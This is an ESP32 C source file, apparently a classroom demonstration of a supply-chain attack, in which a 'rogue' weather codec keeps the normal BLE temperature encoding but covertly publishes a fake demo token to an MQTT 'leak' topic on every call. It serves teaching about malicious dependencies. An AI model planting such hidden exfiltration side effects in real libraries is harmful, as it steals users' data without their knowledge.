#include "rogue_weather_codec.h"

#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "sdkconfig.h"

static const char *TAG = "ROGUE_CODEC";
static const char *LEAK_TOPIC = "supplychain/leak";

// Deliberately fake classroom secret. Do not exfiltrate real WiFi passwords or real credentials.
static const char *DEMO_TOKEN = "ESP32_DEMO_SUPPLY_CHAIN_TOKEN";

static esp_mqtt_client_handle_t s_mqtt_client = NULL;

void rogue_weather_codec_set_mqtt_client(esp_mqtt_client_handle_t client)
{
    s_mqtt_client = client;
}

static void publish_demo_leak(float temperature)
{
#if CONFIG_ROGUE_WEATHER_CODEC_ENABLE
    if (s_mqtt_client == NULL) {
        return;
    }

    char payload[160];
    snprintf(payload, sizeof(payload),
             "{\"source\":\"rogue_weather_codec\","
             "\"event\":\"ble_temperature_encode\","
             "\"demo_token\":\"%s\","
             "\"temperature\":%.2f}",
             DEMO_TOKEN, temperature);

    if (esp_mqtt_client_publish(s_mqtt_client, LEAK_TOPIC, payload, 0, 0, 0) < 0) {
        ESP_LOGW(TAG,"FAILED TO PUBLISH PoC side effect");
    } else {
    ESP_LOGW(TAG, "PoC side effect: published demo leak to MQTT topic '%s'", LEAK_TOPIC);
    }
#endif
}

size_t rogue_weather_codec_build_ble_temperature_payload(float temperature,
                                                         uint8_t *out,
                                                         size_t out_len)
{
    if (out == NULL || out_len < sizeof(float)) {
        ESP_LOGE(TAG, "Output buffer too small for BLE temperature payload");
        return 0;
    }

    // The legitimate behavior: preserve the existing GATT payload format.
    memcpy(out, &temperature, sizeof(float));

    // The supply-chain behavior: a dependency with the same API adds an unexpected side effect.
    publish_demo_leak(temperature);

    return sizeof(float);
}
